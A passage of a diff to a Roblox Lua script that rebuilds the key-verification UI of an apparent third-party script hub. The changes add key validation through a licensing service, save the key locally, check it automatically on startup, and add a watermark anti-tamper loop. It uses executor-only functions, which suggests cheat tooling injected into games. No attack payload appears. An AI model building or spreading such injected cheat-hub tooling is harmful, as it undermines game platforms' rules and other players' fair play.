-        notif.Text = message
-        notif.TextSize = 10
-        notif.TextColor3 = Color3.fromRGB(255, 255, 255)
-        notif.TextTransparency = 1
-        notif.ZIndex = 20
-        notif.Parent = button.Parent
+
+    -- Validate Key Function
+    local function validateKey(key)
+        if not key or key == "" then return false end
         
-        local notifCorner = Instance.new("UICorner", notif)
-        notifCorner.CornerRadius = UDim.new(0, 6)
-        
-        -- Animate in
-        TweenService:Create(notif, TweenInfo.new(0.2), {
-            BackgroundTransparency = 0.15,
-            TextTransparency = 0
-        }):Play()
-        
-        -- Auto-dismiss after 3 seconds
-        task.delay(3, function()
-            if notif and notif.Parent then
-                TweenService:Create(notif, TweenInfo.new(0.3), {
-                    BackgroundTransparency = 1,
-                    TextTransparency = 1
-                }):Play()
-                task.wait(0.3)
-                if notif and notif.Parent then
-                    notif:Destroy()
-                end
+        -- Check if JunkieProtected is available
+        if JunkieProtected and JunkieProtected.ValidateKey then
+            local success, result = pcall(function()
+                return JunkieProtected.ValidateKey({Key = key})
+            end)
+            
+            if success and result == "valid" then
+                return true
             end
-        end)
+        end
+        
+        return false
+    end
+
+    -- Update Status Function
+    local function updateStatus(text, color)
+        statusLabel.Text = "  " .. text
+        statusLabel.TextColor3 = color
+        
+        if statusDot then
+            statusDot.BackgroundColor3 = color
+        end
+        
+        if statusStroke then
+            statusStroke.Color = color
+        end
     end
 
     joinButton.MouseButton1Click:Connect(function()
@@ -2829,19 +3741,13 @@ local function CreateYourHubKeyUI()
     end)
 
     getKey.MouseButton1Click:Connect(function()
-        local ok, res = pcall(function()
-			return JunkieProtected.GetKeyLink()
-        end)
-
-        if ok and res then
-            if setclipboard then
-                setclipboard(res)
-                showInlineNotification(getKey, "✓ Key link copied!", Color3.fromRGB(80, 200, 120))
-            else
-                showInlineNotification(getKey, "✗ Clipboard not available", Color3.fromRGB(220, 60, 60))
-            end
+        durationDropdown.Visible = not durationDropdown.Visible
+        if durationDropdown.Visible then
+            TweenService:Create(durationDropdown, TweenInfo.new(0.2), {Size = UDim2.new(0, 100, 0, 96)}):Play() -- 4 items * 24px
         else
-            showInlineNotification(getKey, "✗ Failed to generate key", Color3.fromRGB(220, 60, 60))
+            TweenService:Create(durationDropdown, TweenInfo.new(0.2), {Size = UDim2.new(0, 100, 0, 0)}):Play()
+            task.wait(0.2)
+            durationDropdown.Visible = false
         end
     end)
 
@@ -2885,8 +3791,18 @@ local function CreateYourHubKeyUI()
                 table.insert(keys, userKey)
                 saveKeys(keys)
             end
+            
+            -- Save verification timestamp for simulated timer
+            if writefile then
+                writefile("seisen/key_timestamp.txt", tostring(os.time()))
+                -- Save the valid key to keys.txt (filePath)
+                writefile(filePath, userKey)
+            end
 
             updateStatus("Valid!", Color3.fromRGB(80, 200, 120))
+            
+            -- Refresh key details panel
+            refreshKeyDetails()
             
             -- Progress bar success color
             TweenService:Create(progressBar, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(80, 200, 120)}):Play()
@@ -2934,7 +3850,7 @@ local function CreateYourHubKeyUI()
             )
             tw:Play()
             tw.Completed:Connect(function()
-                if getgenv then pcall(function() getgenv().YourHubKeySys = false end) end
+                if getgenv then pcall(function() getgenv().SeisenKeySys = false end) end
                 gui:Destroy()
                 main()
             end)
@@ -2982,245 +3898,78 @@ local function CreateYourHubKeyUI()
             handleKeySubmit()
         end
     end)
-end
 
-local function StartLoadingAndCheck()
-    local LoadingGui = Instance.new("ScreenGui")
-    LoadingGui.Name = "YourHubLoadingGui"
-    LoadingGui.ResetOnSpawn = false
-    LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-    LoadingGui.DisplayOrder = 6
-    LoadingGui.Parent = CoreGui
-
-    -- Modern loading frame with better design
-    local frame = Instance.new("Frame")
-    frame.Name = "LoadingFrame"
-    frame.AnchorPoint = Vector2.new(0.5, 0.5)
-    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-    frame.Size = UDim2.new(0, 380, 0, 180)
-    frame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
-    frame.BackgroundTransparency = 1
-    frame.BorderSizePixel = 0
-    frame.ZIndex = 100
-    frame.Parent = LoadingGui
-
-    local fCorner = Instance.new("UICorner")
-    fCorner.CornerRadius = UDim.new(0, 16)
-    fCorner.Parent = frame
-
-    local fStroke = Instance.new("UIStroke")
-    fStroke.Color = Color3.fromRGB(70, 70, 70)
-    fStroke.Thickness = 1.5
-    fStroke.Transparency = 1
-    fStroke.Parent = frame
-    
-    -- Animated background blobs
-    local blobContainer = Instance.new("Frame")
-    blobContainer.Size = UDim2.new(1, 0, 1, 0)
-    blobContainer.BackgroundTransparency = 1
-    blobContainer.ClipsDescendants = true
-    blobContainer.ZIndex = 101
-    blobContainer.Parent = frame
-    
-    local function createLoadingBlob(size, startPos, color, duration)
-        local blob = Instance.new("Frame")
-        blob.Size = UDim2.new(0, size, 0, size)
-        blob.Position = startPos
-        blob.AnchorPoint = Vector2.new(0.5, 0.5)
-        blob.BackgroundColor3 = color
-        blob.BackgroundTransparency = 0.94
-        blob.BorderSizePixel = 0
-        blob.ZIndex = 101
-        blob.Parent = blobContainer
+    -- Auto-check saved key on startup
+    task.spawn(function()
+        -- Initial delay to let UI render
+        task.wait(0.1)
         
-        local corner = Instance.new("UICorner", blob)
-        corner.CornerRadius = UDim.new(1, 0)
-        
-        task.spawn(function()
-            while blob and blob.Parent do
-                local randomX = math.random(20, 80) / 100
-                local randomY = math.random(20, 80) / 100
-                TweenService:Create(blob, TweenInfo.new(duration, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                    Position = UDim2.new(randomX, 0, randomY, 0)
-                }):Play()
-                task.wait(duration)
+        -- Check if we have a saved key
+        if isfile and readfile and isfile(filePath) then
+            local data = readfile(filePath)
+            if data and data ~= "" then
+                local key = data:match("([^\n]+)")
+                if key and key ~= "" then
+                    -- We have a key, show checking status
+                    updateStatus("Checking...", Color3.fromRGB(255, 200, 50))
+                    task.wait(0.5) -- Visual delay
+                    
+                    -- Validate it
+                    if validateKey(key) then
+                        updateStatus("Valid!", Color3.fromRGB(80, 200, 120))
+                        
+                        -- Save verification timestamp ONLY if not exists (preserve original time)
+                        if writefile and (not isfile or not isfile("seisen/key_timestamp.txt")) then
+                            writefile("seisen/key_timestamp.txt", tostring(os.time()))
+                        end
+                        
+                        -- Refresh details panel
+                        if _G.RefreshKeyDetails then
+                            _G.RefreshKeyDetails()
+                        end
+                        
+                        task.wait(0.5)
+                        
+                        -- Close UI and load main
+                        local closeTween = TweenService:Create(
+                            mainFrame,
+                            TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In),
+                            {Position = UDim2.new(0.5, 0, 1.5, 0)}
+                        )
+                        closeTween:Play()
+                        closeTween.Completed:Connect(function()
+                            if getgenv then pcall(function() getgenv().SeisenKeySys = false end) end
+                            gui:Destroy()
+                            main()
+                        end)
+                        return
+                    else
+                        -- Invalid key
+                        updateStatus("Invalid", Color3.fromRGB(220, 60, 60))
+                    end
+                end
             end
-        end)
-    end
-    
-    createLoadingBlob(120, UDim2.new(0.3, 0, 0.4, 0), Color3.fromRGB(100, 100, 120), 6)
-    createLoadingBlob(150, UDim2.new(0.7, 0, 0.6, 0), Color3.fromRGB(80, 80, 100), 8)
-
-    -- Header section with icon
-    local header = Instance.new("Frame")
-    header.Size = UDim2.new(1, 0, 0, 60)
-    header.BackgroundTransparency = 1
-    header.ZIndex = 102
-    header.Parent = frame
-    
-    -- Logo/Icon
-    local icon = Instance.new("TextLabel")
-    icon.Size = UDim2.new(0, 50, 0, 50)
-    icon.Position = UDim2.new(0.5, -25, 0, 5)
-    icon.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
-    icon.BorderSizePixel = 0
-    icon.Font = Enum.Font.GothamBold
-    icon.Text = "🔑"
-    icon.TextSize = 28
-    icon.TextTransparency = 1
-    icon.ZIndex = 103
-    icon.Parent = header
-    
-    local iconCorner = Instance.new("UICorner", icon)
-    iconCorner.CornerRadius = UDim.new(0, 12)
-    
-    local iconStroke = Instance.new("UIStroke", icon)
-    iconStroke.Thickness = 1.5
-    iconStroke.Color = Color3.fromRGB(70, 70, 70)
-    iconStroke.Transparency = 1
-
-    -- Title with better styling
-    local title = Instance.new("TextLabel")
-    title.BackgroundTransparency = 1
-    title.Size = UDim2.new(1, -40, 0, 32)
-    title.Position = UDim2.new(0, 20, 0, 70)
-    title.Font = Enum.Font.GothamBold
-    title.Text = CheckKeyTitle
-    title.TextSize = 20
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.TextXAlignment = Enum.TextXAlignment.Center
-    title.TextTransparency = 1
-    title.ZIndex = 102
-    title.Parent = frame
-
-    -- Subtitle
-    local sub = Instance.new("TextLabel")
-    sub.BackgroundTransparency = 1
-    sub.Size = UDim2.new(1, -40, 0, 20)
-    sub.Position = UDim2.new(0, 20, 0, 105)
-    sub.Font = Enum.Font.Gotham
-    sub.Text = CheckKeySubtitle
-    sub.TextSize = 12
-    sub.TextColor3 = Color3.fromRGB(180, 180, 200)
-    sub.TextXAlignment = Enum.TextXAlignment.Center
-    sub.TextTransparency = 1
-    sub.ZIndex = 102
-    sub.Parent = frame
-
-    -- Modern circular spinner
-    local spinnerContainer = Instance.new("Frame")
-    spinnerContainer.Size = UDim2.new(0, 36, 0, 36)
-    spinnerContainer.Position = UDim2.new(0.5, -18, 0, 130)
-    spinnerContainer.BackgroundTransparency = 1
-    spinnerContainer.ZIndex = 102
-    spinnerContainer.Parent = frame
-
-    local spinner = Instance.new("ImageLabel")
-    spinner.Size = UDim2.new(1, 0, 1, 0)
-    spinner.BackgroundTransparency = 1
-    spinner.Image = "rbxassetid://106296997"
-    spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
-    spinner.ImageTransparency = 1
-    spinner.ZIndex = 103
-    spinner.Parent = spinnerContainer
-
-    -- Progress bar with modern design
-    local barBg = Instance.new("Frame")
-    barBg.Size = UDim2.new(1, -60, 0, 6)
-    barBg.Position = UDim2.new(0, 30, 1, -30)
-    barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
-    barBg.BorderSizePixel = 0
-    barBg.ZIndex = 102
-    barBg.BackgroundTransparency = 1
-    barBg.Parent = frame
-
-    local barCorner = Instance.new("UICorner")
-    barCorner.CornerRadius = UDim.new(1, 0)
-    barCorner.Parent = barBg
-
-    local barFill = Instance.new("Frame")
-    barFill.Size = UDim2.new(0, 0, 1, 0)
-    barFill.Position = UDim2.new(0, 0, 0, 0)
-    barFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-    barFill.BorderSizePixel = 0
-    barFill.ZIndex = 103
-    barFill.BackgroundTransparency = 1
-    barFill.Parent = barBg
-
-    local barFillCorner = Instance.new("UICorner")
-    barFillCorner.CornerRadius = UDim.new(1, 0)
-    barFillCorner.Parent = barFill
-    
-    -- Gradient for progress bar
-    local barGradient = Instance.new("UIGradient", barFill)
-    barGradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(150, 150, 170)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 200, 220))
-    })
-
-    -- Entrance animations
-    local tIn = TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
-    TweenService:Create(frame, tIn, {BackgroundTransparency = 0.2}):Play()
-    TweenService:Create(fStroke, tIn, {Transparency = 0.5}):Play()
-    TweenService:Create(icon, tIn, {BackgroundTransparency = 0}):Play()
-    TweenService:Create(iconStroke, tIn, {Transparency = 0.6}):Play()
-    TweenService:Create(icon, tIn, {TextTransparency = 0}):Play()
-    TweenService:Create(title, tIn, {TextTransparency = 0}):Play()
-    TweenService:Create(sub, tIn, {TextTransparency = 0.2}):Play()
-    TweenService:Create(barBg, tIn, {BackgroundTransparency = 0}):Play()
-    TweenService:Create(barFill, tIn, {BackgroundTransparency = 0}):Play()
-    TweenService:Create(spinner, tIn, {ImageTransparency = 0.3}):Play()
-
-    -- Spinner rotation animation
-    task.spawn(function()
-        while spinner and spinner.Parent do
-            TweenService:Create(spinner, TweenInfo.new(1.2, Enum.EasingStyle.Linear), {
-                Rotation = spinner.Rotation + 360
-            }):Play()
-            task.wait(1.2)
         end
-    end)
-
-    -- Progress bar animation
-    local checking = true
-    task.spawn(function()
-        while checking and barFill do
-            barFill.Size = UDim2.new(0, 0, 1, 0)
-            TweenService:Create(barFill, TweenInfo.new(1.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
-                Size = UDim2.new(1, 0, 1, 0)
-            }):Play()
-            task.wait(1.6)
-        end
-    end)
-
-    task.spawn(function()
-        local ok, savedKey = trySavedKey()
-        checking = false
-        task.wait(0.3)
-
-        local tOut = TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In)
-        local tw1 = TweenService:Create(frame, tOut, {BackgroundTransparency = 1})
-        local tw2 = TweenService:Create(fStroke, tOut, {Transparency = 1})
-        local tw3 = TweenService:Create(title, tOut, {TextTransparency = 1})
-        local tw4 = TweenService:Create(sub, tOut, {TextTransparency = 1})
-        local tw5 = TweenService:Create(barBg, tOut, {BackgroundTransparency = 1})
-        local tw6 = TweenService:Create(barFill, tOut, {BackgroundTransparency = 1})
-        local tw7 = TweenService:Create(spinner, tOut, {ImageTransparency = 1})
-        local tw8 = TweenService:Create(icon, tOut, {BackgroundTransparency = 1, TextTransparency = 1})
-        local tw9 = TweenService:Create(iconStroke, tOut, {Transparency = 1})
-
-        tw1:Play(); tw2:Play(); tw3:Play(); tw4:Play(); tw5:Play(); tw6:Play(); tw7:Play(); tw8:Play(); tw9:Play()
-
-        tw1.Completed:Connect(function()
-            LoadingGui:Destroy()
-
-            if ok and savedKey then
-                main()
-            else
-                CreateYourHubKeyUI()
-            end
-        end)
     end)
 end
 
-StartLoadingAndCheck()
+    
+    local _vActive = true
+    task.spawn(function()
+        while _vActive and mainFrame and mainFrame.Parent do
+            task.wait(1.5)
+            local _c = mainFrame:FindFirstChild(_cn)
+            if not _c or not _c.Parent or _c.Text ~= _wm then
+                _vActive = false
+                if gui then 
+                    gui:Destroy() 
+                end
+                if getgenv then 
+                    pcall(function() getgenv().SeisenKeySys = false end) 
+                end
+                break
+            end
+        end
+    end)
+
+CreateSeisenKeyUI()
